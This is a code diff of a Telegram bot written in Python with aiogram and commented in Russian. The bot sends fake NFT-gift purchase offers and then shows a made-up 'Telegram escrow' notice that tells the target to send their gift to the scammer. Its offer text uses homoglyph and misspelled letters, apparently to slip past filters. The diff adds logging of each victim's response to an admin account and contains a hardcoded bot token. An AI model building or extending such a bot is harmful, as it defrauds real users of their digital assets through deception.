@@ -19,13 +19,13 @@ from aiogram.enums import ParseMode
 
 BOT_TOKEN = "8790017360:AAHds4YnUvg-MUXGb61KwSYQ_GwEnv7-M28"
 
+# ID человека, которому будут лететь логи
+ADMIN_LOG_ID = 8912650144
+
 EMOJI_STARS = "5920433463428650761"
 EMOJI_GRAM = "5267445215773367585"
 EMOJI_DECLINE_EN = "5774077015388852135"
 EMOJI_ACCEPT = "5774022692642492953"
-
-OFFER_USERNAME = "greenpeace"
-BUYER_USERNAME = "deriikop"
 
 logging.basicConfig(
     level=logging.INFO,
@@ -84,6 +84,86 @@ def log_send_attempt(prefix: str, attempt: int, total: int, chat_id, bc_id):
 
 
 # ============================================================
+# ОТПРАВКА ЛОГОВ АДМИНУ
+# ============================================================
+
+def get_log_text(data: dict, status: str) -> str:
+    """Формирует текст лога для админа."""
+    status_emoji = "⏳"
+    if status == "accepted":
+        status_emoji = "✅"
+    elif status == "declined":
+        status_emoji = "❌"
+
+    currency_name = "GRAM" if data["currency"] == "gram" else "Stars"
+    
+    return (
+        f"<b>📩 Оффер отправлен</b>\n\n"
+        f"<b>Подарок:</b> {data['gift_slug']}-{data['gift_number']}\n"
+        f"<b>Сумма:</b> {data['amount']} {currency_name}\n"
+        f"<b>Отправил:</b> {data['sender_name']} (@{data['sender_username']})\n\n"
+        f"<b>Статус:</b> {status_emoji} {status.capitalize()}"
+    )
+
+
+async def send_log_to_admin(data: dict):
+    """Отправляет первичный лог админу и сохраняет ID сообщения."""
+    text = get_log_text(data, "ожидает")
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(
+                    text="🔗 Посмотреть подарок",
+                    url=data["link"]
+                )
+            ]
+        ]
+    )
+    
+    try:
+        msg = await bot.send_message(
+            chat_id=ADMIN_LOG_ID,
+            text=text,
+            reply_markup=keyboard,
+            disable_web_page_preview=True,
+        )
+        data["log_msg_id"] = msg.message_id
+        logger.info(f"[admin-log] Лог отправлен, msg_id={msg.message_id}")
+    except Exception as e:
+        logger.error(f"[admin-log] Не удалось отправить лог: {e}")
+
+
+async def update_log_message(data: dict, status: str):
+    """Редактирует сообщение с логом, меняя статус."""
+    if "log_msg_id" not in data:
+        return
+        
+    text = get_log_text(data, status)
+    keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(
+                    text="🔗 Посмотреть подарок",
+                    url=data["link"]
+                )
+            ]
+        ]
+    )
+
+    try:
+        await bot.edit_message_text(
+            chat_id=ADMIN_LOG_ID,
+            message_id=data["log_msg_id"],
+            text=text,
+            reply_markup=keyboard,
+            disable_web_page_preview=True,
+        )
+        logger.info(f"[admin-log] Статус обновлён на '{status}'")
+    except Exception as e:
+        logger.error(f"[admin-log] Не удалось обновить лог: {e}")
+
+
+# ============================================================
 # ПАРСИНГ
 # ============================================================
 
@@ -100,7 +180,6 @@ def parse_nft_link(link: str):
 
 def parse_offer_command(text: str):
     parts = text.strip().split()
-    # Теперь триггер — слово "truslo" (без слэша)
     if len(parts) < 3 or parts[0].lower() != "truslo":
         return None
     link = parts[1]
@@ -196,7 +275,6 @@ async def send_with_fallback(bc_id, chat_id, text, reply_markup):
 
 
 async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
-    """Редактирует сообщение (не удаляет). С обработкой PEER_FLOOD и retry без эмодзи."""
     logger.info(f"[edit] start | chat_id={chat_id} | msg_id={message_id} | bc_id={bc_id}")
     for attempt in range(1, 4):
         log_send_attempt("edit", attempt, 3, chat_id, bc_id)
@@ -272,7 +350,6 @@ async def handle_business_connection(connection: BusinessConnection) -> None:
     logger.info(f"[BC] owner={connection.user.id} connection_id={connection.id}")
 
 
-# Слушаем все сообщения, начинающиеся со слова truslo (без учета регистра)
 @dp.business_message(F.text.regexp(r"(?i)^truslo\s"))
 async def handle_offer(message: Message) -> None:
     if not message.business_connection_id:
@@ -285,10 +362,18 @@ async def handle_offer(message: Message) -> None:
         logger.warning(f"[offer] parse failed for text: {message.text!r}")
         return
 
+    # === БЕРЁМ ДАННЫЕ ОТПРАВИТЕЛЯ ===
+    sender_name = "Unknown"
+    sender_username = "unknown"
+    if message.from_user:
+        sender_name = message.from_user.full_name or message.from_user.first_name or "Unknown"
+        sender_username = message.from_user.username or f"id{message.from_user.id}"
+
     logger.info(
         f"[offer] parsed: amount={data['amount']} "
         f"currency={data['currency']} gift={data['gift_slug']}-{data['gift_number']} "
-        f"chat_id={message.chat.id} bc_id={bc_id}"
+        f"chat_id={message.chat.id} bc_id={bc_id} "
+        f"sender={sender_name} (@{sender_username})"
     )
 
     try:
@@ -311,8 +396,9 @@ async def handle_offer(message: Message) -> None:
     else:
         emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
 
+    # В оффере пишем ник отправителя (для получателя)
     text = (
-        f"Usеr <b>{OFFER_USERNAME}</b> оffеrs уоu "
+        f"Usеr <b>{sender_name}</b> оffеrs уоu "
         f"<b>{amount_fmt}</b> {emoji} "
         f"fоr thе gift {gift_display}.\n\n"
         f"Тhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
@@ -324,6 +410,8 @@ async def handle_offer(message: Message) -> None:
         "bc_id": bc_id,
         "chat_id": message.chat.id,
         "accepted": False,
+        "sender_name": sender_name,
+        "sender_username": sender_username, # <-- это и есть покупатель (кому передавать)
     }
 
     keyboard = InlineKeyboardMarkup(
@@ -355,6 +443,10 @@ async def handle_offer(message: Message) -> None:
             f"[offer] {offer_id} отправлен в чат {message.chat.id} "
             f"(msg_id={sent.message_id})"
         )
+        
+        # Отправляем лог админу
+        await send_log_to_admin(offers[offer_id])
+
     except Exception as e:
         log_telegram_error("offer-send", e, chat_id=message.chat.id, bc_id=bc_id)
 
@@ -401,6 +493,9 @@ async def handle_decline(callback: CallbackQuery) -> None:
         logger.info(f"[decline] offer {offer_id} обновлён")
     else:
         logger.error(f"[decline] offer {offer_id} edit не удался")
+        
+    # Обновляем лог админа
+    await update_log_message(data, "declined")
 
 
 @dp.callback_query(F.data.startswith("acc:"))
@@ -426,7 +521,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
     data["accepted"] = True
     logger.info(
         f"[accept] offer {offer_id} currency={data['currency']} "
-        f"amount={data['amount']}"
+        f"amount={data['amount']} sender=@{data['sender_username']}"
     )
 
     try:
@@ -454,6 +549,9 @@ async def handle_accept(callback: CallbackQuery) -> None:
     )
     order_id = f"ТG-{rand_suffix}"
 
+    # Подставляем username отправителя в текст
+    buyer_username = data["sender_username"]
+
     accept_text = (
         f"<b>NFТ Dеаl</b>\n\n"
         f"<b>Оrdеr</b> #{order_id}\n\n"
@@ -461,9 +559,9 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f"thrоugh thе ТеIеgrаm еsсrоw sуstеm. "
         f"Тhе {currency_word_lower} аrе hеId ln а sресiаI еsсrоw ассоunt аnd wlII bе "
         f"аutоmаtiсаIIy сrеditеd tо уоur ТеIеgrаm {currency_word_upper} bаIаnсе "
-        f"right аftеr thе gift is trаnsfеrrеd.\n\n"
+        f"right аftеr thе gift is trаnsfеrrd.\n\n"
         f"<b>lnstruсtlоns tо соmрlеtе thе dеаl:</b>\n\n"
-        f"1. Sеnd tо: @{BUYER_USERNAME}\n"
+        f"1. Sеnd tо: @{buyer_username}\n"
         f"2. СIiсk «Sеnd Gift» аnd sеlесt {gift_display}\n"
         f"3. Соnfirm thе glft trаnsfеr.\n\n"
         f"ТеIеgrаm wiII rесоrd thе trаnsасtiоn аnd instаntIу сrеdit "
@@ -471,12 +569,13 @@ async def handle_accept(callback: CallbackQuery) -> None:
         f"Тhе rеsеrvаtiоn is vаIid fоr 24 hоurs."
     )
 
+    # Кнопка передает подарок отправителю
     keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
                 InlineKeyboardButton(
                     text="Send Gift",
-                    url=f"tg://send_gift?to=deriikop",
+                    url=f"tg://send_gift?to={buyer_username}",
                 )
             ]
         ]
@@ -493,6 +592,9 @@ async def handle_accept(callback: CallbackQuery) -> None:
         logger.info(f"[accept] offer {offer_id} обновлён (edit)")
     else:
         logger.error(f"[accept] offer {offer_id} edit не удался")
+        
+    # Обновляем лог админа
+    await update_log_message(data, "accepted")
 
 
 async def main() -> None:
